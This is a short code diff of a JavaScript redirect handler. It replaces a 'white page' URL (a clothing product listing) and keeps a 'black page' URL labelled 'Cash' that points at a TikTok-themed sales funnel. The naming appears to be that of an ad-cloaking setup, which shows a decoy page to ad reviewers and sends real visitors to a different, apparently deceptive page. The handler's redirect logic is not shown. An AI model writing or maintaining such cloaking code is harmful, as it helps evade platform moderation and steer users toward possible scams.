@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://xavemenmyshopifycom.creator-spring.com/listing/xaveman-clothing?product=636";
+    const whitePageURL = "https://original.pk/products/foggy-gray-fold-in-pocket-womens-winter-coat-packable-lightweight-full-zip-puffer-with-hood-quilted-amess-b0b27l869q";
     // Cash
     const blackPageURL = "https://YAbHewMyUM.myfunnelish.com/tiktok-vote123-second";
   
